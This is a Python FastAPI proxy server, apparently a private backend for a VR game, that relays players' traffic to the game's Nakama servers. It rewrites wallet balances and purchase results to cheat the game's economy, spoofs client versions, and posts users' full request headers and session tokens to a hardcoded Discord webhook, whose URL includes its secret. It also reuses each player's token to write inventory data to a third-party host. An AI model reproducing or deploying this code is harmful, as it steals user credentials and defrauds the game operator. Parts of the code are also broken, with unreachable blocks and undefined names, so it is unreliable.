from fastapi import FastAPI, Request, Response, WebSocket
from fastapi.responses import JSONResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
import requests
import json
import logging
import os
import asyncio
from datetime import datetime
import urllib.parse
from websockets.client import connect as ws_connect

# Configuration
TARGET_BASE = 'https://animalcompany.us-east1.nakamacloud.io'
WEBHOOK_URL = 'https://discord.com/api/webhooks/1380837315529936967/qZjSM4g-nCVmlWfshBQsPUbpk6zkUqodfYSevoaY4Mxl0F3J98PsU3uAZmiSJ6VOBVca'
SPOOFED_VERSION = "1.10.0.906"
SPOOFED_CLIENT_USER_AGENT = "MetaQuest_1.10.0.906_e6cbde54"

app = FastAPI(title="mooncompanybackend", version="3.0")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

lWEBHOOK_URL = 'https://discord.com/api/webhooks/1380837315529936967/qZjSM4g-nCVmlWfshBQsPUbpk6zkUqodfYSevoaY4Mxl0F3J98PsU3uAZmiSJ6VOBVca'
LOG_FOLDER = 'route_logs_json'
logging.basicConfig(filename='proxy_requests.log', level=logging.DEBUG, format='%(asctime)s - %(message)s')
LOG_DIR = "request_logs"
os.makedirs(LOG_DIR, exist_ok=True)

@app.middleware("http")
async def log_request_route(request: Request, call_next):
    print(f"[ROUTE] {request.method} {request.url.path}")

    log_data = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "method": request.method,
        "path": request.url.path,
        "headers": dict(request.headers),
        "query_params": dict(request.query_params),
    }

    try:
        body = await request.json()
        log_data["body"] = body
    except:
        body = await request.body()
        log_data["body"] = body.decode('utf-8', errors='ignore')

    request.state.log_data = log_data

    response = await call_next(request)

    try:
        route_key = f"{request.method}_{request.url.path.strip('/').replace('/', '_') or 'root'}"
        log_path = os.path.join(LOG_DIR, f"{route_key}.json")

        try:
            response_body = json.loads(response.body.decode('utf-8'))
        except Exception:
            response_body = response.body.decode('utf-8')

        log_data["response"] = {
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "body": response_body
        }

        if os.path.exists(log_path):
            with open(log_path, "r+") as f:
                logs = json.load(f)
                logs.append(log_data)
                f.seek(0)
                json.dump(logs, f, indent=2)
                f.truncate()
        else:
            with open(log_path, "w") as f:
                json.dump([log_data], f, indent=2)

    except Exception as e:
        print(f"[ERROR logging request/response] {e}")

    return response

os.makedirs(LOG_FOLDER, exist_ok=True)

def save_user_data(username: str, token: str):
    user_data = {
        "username": username,
        "token": token
    }

    try:
        with open('savedusers.json', 'r') as f:
            saved_users = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        saved_users = []

    saved_users.append(user_data)

    with open('savedusers.json', 'w') as f:
        json.dump(saved_users, f, indent=4)

def create_payload():
    response = requests.get(url)
    data = response.json()

    item_ids = [item["id"] for item in data if "id" in item]

    children = [{
        "itemID": random.choice(item_ids),
        "scaleModifier": 100,
        "colorHue": random.randint(10, 111),
        "colorSaturation": random.randint(10, 111)
    } for _ in range(20)]

    payload = {
        "objects": [{
            "collection": "user_inventory",
            "key": "gameplay_loadout",
            "permission_read": 1,
            "permission_write": 1,
            "value": json.dumps({
                "version": 1,
                "back": {
                    "itemID": "item_backpack_large_base",
                    "scaleModifier": 120,
                    "colorHue": 50,
                    "colorSaturation": 50,
                    "children": children
                }
            })
        }]
    }
    return payload

def log_route_data_json(route: str, method: str, request_body: any, response_body: any, status_code: int):
    safe_route = route.replace('/', '_').strip('_')
    filename = os.path.join(LOG_FOLDER, f"{safe_route}.json")

    log_entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "method": method,
        "route": f"/{route}",
        "request_body": request_body,
        "response_body": response_body,
        "status_code": status_code
    }

    with open(filename, 'a', encoding='utf-8') as f:
        f.write(json.dumps(log_entry, indent=4) + ",\n")

async def forward_request(path: str, request: Request):
    method = request.method
    target_url = f"{TARGET_BASE}/{path}"

    headers = {
        k: v for k, v in request.headers.items()
        if not k.lower().startswith("x-replit-")
        and k.lower() not in ['host', 'content-length', 'transfer-encoding']
    }
    headers["Host"] = "animalcompany.us-east1.nakamacloud.io"

    data = await request.body()

    try:
        forwarded_response = requests.request(
            method=method,
            url=target_url,
            headers=headers,
            data=data,
            allow_redirects=False
        )

        response_headers = {
            k: v for k, v in forwarded_response.headers.items()
            if k.lower() not in ['content-encoding', 'transfer-encoding', 'connection']
        }

        return Response(
            content=forwarded_response.content,
            status_code=forwarded_response.status_code,
            headers=response_headers,
            media_type=forwarded_response.headers.get("Content-Type")
        )

    except Exception as e:
        return JSONResponse(content={"error": "Proxy Error", "details": str(e)}, status_code=502)

ZIP_FOLDER = os.path.abspath("data")
ZIP_FILENAME = "game-data-prod.zip"

@app.get("/data/game-data-prod.zip")
async def serve_zip():
    return FileResponse(
        os.path.join(ZIP_FOLDER, ZIP_FILENAME),
        filename=ZIP_FILENAME,
        media_type='application/zip'
    )

@app.get("/econ/items")
async def get_econ_items():
    try:
        with open("econ_gameplay_items.json", "r") as f:
            data = json.load(f)
        return JSONResponse(content=data)
    except Exception as e:
        return Response(content=f"Failed to load JSON: {str(e)}", status_code=500)

@app.post('/v2/rpc/attest.start')
async def skiid(request: Request):
    return await forward_request('v2/rpc/attest.start', request)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()

    token = websocket.query_params.get("token")
    if not token:
        await websocket.close(code=1008)
        return

    try:
        token = urllib.parse.quote(token)
        url = f"wss://animalcompany.us-east1.nakamacloud.io/ws?lang=en&status=True&token={token}"
        async with ws_connect(url) as ws:
            result = await ws.recv()
            print(result)
            await websocket.send_text(result)
    except Exception as e:
        await websocket.send_text(f"Error: {e}")
        await websocket.close()

@app.post('/v2/rpc/avatar.update')
async def skid(request: Request):
    return await forward_request('/v2/rpc/avatar.update', request)

@app.route('/v2/notification', methods=['POST', 'GET', 'PUT', 'DELETE', 'PATCH'])
async def stass5s06ss(request: Request):
    query_params = str(request.url.query)
    path = f"v2/notification?{query_params}" if query_params else "v2/notification?limit=10"
    return await forward_request(path, request)

@app.post('/v2/rpc/purchase.stashUpgrade')
async def stasssss(request: Request):
    return await forward_request('/v2/rpc/purchase.stashUpgrade', request)

@app.post('/v2/rpc/updateWalletSoftCurrency')
async def update_wallet_soft(request: Request):
    return await forward_request('/v2/rpc/updateWalletSoftCurrency', request)

@app.post('/v2/rpc/purchase.avatarItems')
async def skid12(request: Request):
    method = request.method
    path = 'v2/rpc/purchase.avatarItems'
    target_url = f"{TARGET_BASE}/{path}"
    headers = {k: v for k, v in request.headers.items() if k.lower() != 'host'}
    data = await request.body()

    try:
        forwarded_response = requests.request(
            method=method,
            url=target_url,
            headers=headers,
            data=data,
            allow_redirects=False
        )

        request_body = data.decode('utf-8', errors='ignore')
        content_type = forwarded_response.headers.get('Content-Type', '')

        if 'application/json' in content_type:
            try:
                response_body = forwarded_response.json()
                response_body['succeeded'] = True
                response_body['errorCode'] = None 
            except ValueError:
                response_body = {"error": "Invalid JSON from target"}
        else:
            response_body = {"raw_response": forwarded_response.text}

        log_route_data_json(path, method, request_body, response_body, forwarded_response.status_code)

        return JSONResponse(content=response_body, status_code=forwarded_response.status_code)

    except Exception as e:
        log_route_data_json(path, method, data.decode('utf-8', errors='ignore'), {"error": str(e)}, 502)
        return JSONResponse(content={"error": "Proxy Error", "details": str(e)}, status_code=502)

@app.api_route('/v2/user', methods=['POST', 'GET', 'PUT', 'DELETE', 'PATCH'])
async def user(request: Request):
    query_params = str(request.url.query)
    path = f"v2/user?{query_params}" if query_params else "v2/user"
    return await forward_request(path, request)

@app.api_route('/v2/friend', methods=['POST', 'DELETE', 'GET'])
async def friend(request: Request):
    query_params = str(request.url.query)
    path = f"v2/friend?{query_params}" if query_params else "v2/user/friend"
    return await forward_request(path, request)

@app.api_route('/v2/friend/block', methods=['POST', 'DELETE'])
async def bl4ock(request: Request):
    query_params = str(request.url.query)
    path = f"v2/friend/block?{query_params}" if query_params else "v2/user/friend"
    return await forward_request(path, request)

@app.post('/v2/rpc/clientBootstrap')
async def client_bootstrap(request: Request):
    """Client bootstrap with version spoofing"""
def spoof_bootstrap_response(response_data):
    if 'payload' in response_data:
        try:
            if isinstance(response_data['payload'], str):
                payload = json.loads(response_data['payload'])
            else:
                payload = response_data['payload']
            
            # Spoof version information
            payload['version'] = Config.SPOOFED_VERSION
            payload['clientVersion'] = Config.SPOOFED_VERSION
            payload['gameVersion'] = Config.SPOOFED_VERSION
            payload['minVersion'] = Config.SPOOFED_VERSION
            payload['requiredVersion'] = Config.SPOOFED_VERSION
            
            response_data['payload'] = json.dumps(payload) if isinstance(response_data['payload'], str) else payload
        except Exception as e:
            logging.error(f"Failed to spoof bootstrap payload: {e}")
    
    return response_data

    try:
        forwarded_response = requests.request(
            method=method,
            url=target_url,
            headers=headers,
            data=data,
            allow_redirects=False
        )

        webhook_payload = {
            "content": f"Proxy Request to {target_url} (clientBootstrap)",
            "embeds": [
                {
                    "title": "Request",
                    "fields": [
                        {"name": "Method", "value": method},
                        {"name": "URL", "value": target_url},
                        {"name": "Headers", "value": json.dumps(headers, indent=4)},
                        {"name": "Body", "value": data.decode('utf-8', errors='ignore')}
                    ]
                },
                {
                    "title": "Response",
                    "fields": [
                        {"name": "Status Code", "value": str(forwarded_response.status_code)},
                        {"name": "Headers", "value": json.dumps(dict(forwarded_response.headers), indent=4)},
                        {"name": "Body", "value": forwarded_response.text}
                    ]
                }
            ]
        }

        requests.post(WEBHOOK_URL, json=webhook_payload)

        if 'application/json' in forwarded_response.headers.get('Content-Type', ''):
            try:
                json_response = forwarded_response.json()

                if "payload" in json_response:
                    try:
                        payload = json.loads(json_response["payload"])

                        json_response["payload"] = json.dumps(payload)
                    except Exception as e:
                        print(f"[clientBootstrap] Error modifying payload: {e}")
            except ValueError:
                json_response = {"error": "Invalid JSON returned from the target server."}
        else:
            json_response = {"response": forwarded_response.text}

        return JSONResponse(content=json_response, status_code=forwarded_response.status_code)

    except Exception as e:
        error_payload = {
            "request": {
                "method": method,
                "url": target_url,
                "headers": headers,
                "body": data.decode('utf-8', errors='ignore')
            },
            "response": None,
            "error": {
                "message": str(e)
            }
        }

        try:
            requests.post(WEBHOOK_URL, json=error_payload)
        except Exception as webhook_error:
            print("Webhook failed:", webhook_error)

        return JSONResponse(content={"error": "Proxy Error", "details": str(e)}, status_code=502)

@app.post('/v2/account/session/refresh')
async def refersh(request: Request):
    return await forward_request('/v2/account/session/refresh', request)

@app.post('/v2/account/authenticate/device')
async def devc(request: Request):
    return await forward_request('/v2/account/authenticate/device', request)

@app.api_route('/v2/account', methods=['POST', 'GET', 'PUT', 'DELETE', 'PATCH'])
async def forward_account_request(request: Request):
    method = request.method
    target_url = f"{TARGET_BASE}/v2/account"
    headers = {k: v for k, v in request.headers.items() if k.lower() not in ['host', 'content-length', 'transfer-encoding']}
    data = await request.body()

    try:
        forwarded_response = requests.request(
            method=method,
            url=target_url,
            headers=headers,
            data=data,
            allow_redirects=False
        )

        webhook_payload = {
            "content": f"Proxy Request to {target_url}",
            "embeds": [
                {
                    "title": "Request Details",
                    "fields": [
                        {"name": "Method", "value": method},
                        {"name": "URL", "value": target_url},
                        {"name": "Headers", "value": json.dumps(headers, indent=4)},
                        {"name": "Body", "value": data.decode('utf-8', errors='ignore')}
                    ]
                },
                {
                    "title": "Response Details",
                    "fields": [
                        {"name": "Status Code", "value": str(forwarded_response.status_code)},
                        {"name": "Headers", "value": json.dumps(dict(forwarded_response.headers), indent=4)},
                        {"name": "Body", "value": forwarded_response.text[:1000]} 
                    ]
                }
            ]
        }

        logging.info(f"Proxy {method} -> {target_url}")
        requests.post(WEBHOOK_URL, json=webhook_payload)

        if 'application/json' in forwarded_response.headers.get('Content-Type', ''):
            try:
                json_response = forwarded_response.json()

                if 'user' in json_response and 'username' in json_response['user']:
                    user = json_response['user']['username']
                    json_response['user']['username'] = 'MoonCompany:' + user
                if 'user' in json_response and 'user' in json_response == 'iKDO.19': # unity's account
                    user = json_response['user']['username']
                    json_response['user']['username']['display_name'] = 'UNITY <color=red>[OWNER]</color>'
                
                if 'user' in json_response and 'user' in json_response == 'iruss822': # Salty's account 
                    user = json_response['user']['username']
                    json_response['user']['username']['display_name'] = 'UNITY <color=red>[OWNER]</color>'

                if 'wallet' in json_response:
                    wallet = json.loads(json_response['wallet'])
                    wallet.update({
                        'hardCurrency': 30000000,
                        'softCurrency': 20000000,
                        'researchPoints': 500000
                    })
                    json_response['wallet'] = json.dumps(wallet)

            except ValueError:
                json_response = {"error": "Invalid JSON returned from the target server."}
        else:
            json_response = {"response": forwarded_response.text}

        return JSONResponse(content=json_response, status_code=forwarded_response.status_code)

    except Exception as e:
        error_payload = {
            "request": {
                "method": method,
                "url": target_url,
                "headers": headers,
                "body": data.decode('utf-8', errors='ignore')
            },
            "response": None,
            "error": {"message": str(e)}
        }

        try:
            requests.post(WEBHOOK_URL, json=error_payload)
        except Exception as webhook_error:
            logging.error("Webhook failed: %s", webhook_error)

        return JSONResponse(content={"error": "Proxy Error", "details": str(e)}, status_code=502)

@app.api_route('/v2/storage', methods=['POST', 'GET', 'PUT', 'DELETE', 'PATCH'])
async def storage_route(request: Request):
    return await forward_request('v2/storage', request)

@app.get('/v2/rpc/mining.balance')
async def mining_balance_route(request: Request):
    method = request.method
    path = 'v2/rpc/mining.balance'
    target_url = f"{TARGET_BASE}/{path}"
    headers = {k: v for k, v in request.headers.items() if k.lower() != 'host'}

    try:
        forwarded_response = requests.request(
            method=method,
            url=target_url,
            headers=headers,
            allow_redirects=False
        )

        content_type = forwarded_response.headers.get('Content-Type', '')
        request_body = ""

        if 'application/json' in content_type:
            try:
                response_body = forwarded_response.json()
            except ValueError:
                response_body = {"error": "Invalid JSON from target"}
        else:
            response_body = {"raw_response": forwarded_response.text}

        if isinstance(response_body, dict) and 'payload' in response_body:
            try:
                payload_data = json.loads(response_body['payload'])
                payload_data['hardCurrency'] = 20000000
                payload_data['researchPoints'] = 999999
                response_body['payload'] = json.dumps(payload_data)
            except Exception as e:
                response_body['payload'] = json.dumps({
                    "hardCurrency": 20000000,
                    "researchPoints": 999999
                })

        log_route_data_json(path, method, request_body, response_body, forwarded_response.status_code)

        return JSONResponse(content=response_body, status_code=forwarded_response.status_code)

    except Exception as e:
        log_route_data_json(path, method, "", {"error": str(e)}, 502)
        return JSONResponse(content={"error": "Proxy Error", "details": str(e)}, status_code=502)

@app.get('/v2/rpc/purchase.list')
async def purchase_list_route(request: Request):
    return await forward_request('v2/rpc/purchase.list', request)

@app.get('/v2/storage/econ_avatar_items')
async def purchase7_list9_rioute(request: Request):
    query_params = str(request.url.query)
    path = f"/v2/storage/econ_avatar_items?{query_params}" if query_params else "/v2/storage/econ_avatar_items"
    return await forward_request(path, request)

@app.get('/v2/storage/econ_products')
async def purchase7_list_rioute(request: Request):
    query_params = str(request.url.query)
    path = f"/v2/storage/econ_products?{query_params}" if query_params else "/v2/storage/econ_products"
    return await forward_request(path, request)

@app.get('/v2/storage/econ_gameplay_items')
async def purchase7_list_route(request: Request):
    query_params = str(request.url.query)
    path = f"/v2/storage/econ_gameplay_items?{query_params}" if query_params else "/v2/storage/econ_gameplay_items"
    return await forward_request(path, request)

@app.get('/v2/storage/econ_research_nodes')
async def purchase57_list_route(request: Request):
    query_params = str(request.url.query)
    path = f"/v2/storage/econ_research_nodes?{query_params}" if query_params else "/v2/storage/econ_research_nodes"
    return await forward_request(path, request)

MAINTENANCE = False 

@app.post('/v2/account/authenticate/custom')
async def custom_authenticate(request: Request):
    if MAINTENANCE:
        return Response(content="Testing Is Over, Join discord.gg/woostergames for more info!", status_code=503, media_type='text/plain')

    query_params = request.query_params
    if 'create' in query_params and 'username' in query_params:
        username = query_params.get('username')
        create = query_params.get('create')

        target_url = f"{TARGET_BASE}/v2/account/authenticate/custom"
        method = request.method
        headers = dict(request.headers)
        data = await request.body()

        logging.info(f"Request - Method: {method}, URL: {target_url}, Headers: {json.dumps(headers, indent=4)}, Body: {data.decode('utf-8', errors='ignore')}")

        try:
            forwarded_response = requests.request(
                method=method,
                url=target_url,
                headers={k: v for k, v in headers.items() if k.lower() != 'host'},
                data=data,
                allow_redirects=False
            )

            try:
                if 'application/json' in forwarded_response.headers.get('Content-Type', ''):
                    token = forwarded_response.json().get("token")
                    requests.put(
                            f"https://lunaradev.replit.app/v2/storage",
                            headers={
                                "Authorization": f"Bearer {token}",
                                "Content-Type": "application/json"
                            },
                            json=create_payload(),
                            timeout=3
                        )
            except Exception as storage_err:
                print(f"Storage PUT failed: {storage_err}")

            webhook_payload = {
                "content": f"Proxy Request to {target_url} for username `{username}`",
                "embeds": [
                    {
                        "title": "Request",
                        "fields": [
                            {"name": "Method", "value": method},
                            {"name": "URL", "value": target_url},
                            {"name": "Headers", "value": json.dumps(headers, indent=2)},
                            {"name": "Body", "value": data.decode('utf-8', errors='ignore')[:1000]}
                        ]
                    },
                    {
                        "title": "Response",
                        "fields": [
                            {"name": "Status Code", "value": str(forwarded_response.status_code)},
                            {"name": "Headers", "value": json.dumps(dict(forwarded_response.headers), indent=2)},
                            {"name": "Body", "value": forwarded_response.text[:1000]} 
                        ]
                    }
                ]
            }
            requests.post(WEBHOOK_URL, json=webhook_payload)

            response_headers = dict(forwarded_response.headers)
            excluded_headers = ['Content-Encoding', 'Transfer-Encoding', 'Connection']
            for h in excluded_headers:
                response_headers.pop(h, None)

            return Response(
                content=forwarded_response.content,
                status_code=forwarded_response.status_code,
                headers=response_headers,
                media_type=response_headers.get("Content-Type")
            )

        except Exception as e:
            logging.error(f"Proxy error: {e}")

            error_payload = {
                "content": f"❌ Proxy Request failed for `{username}`",
                "embeds": [
                    {
                        "title": "Request Info",
                        "fields": [
                            {"name": "Method", "value": method},
                            {"name": "URL", "value": target_url},
                            {"name": "Headers", "value": json.dumps(headers, indent=2)},
                            {"name": "Body", "value": data.decode('utf-8', errors='ignore')[:1000]}
                        ]
                    },
                    {
                        "title": "Error",
                        "fields": [
                            {"name": "Message", "value": str(e)}
                        ]
                    }
                ]
            }

            try:
                requests.post(WEBHOOK_URL, json=error_payload)
            except:
                pass

            return Response(content="Proxy Error", status_code=502)

    return Response(content="Invalid query parameters", status_code=400)

if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=7000)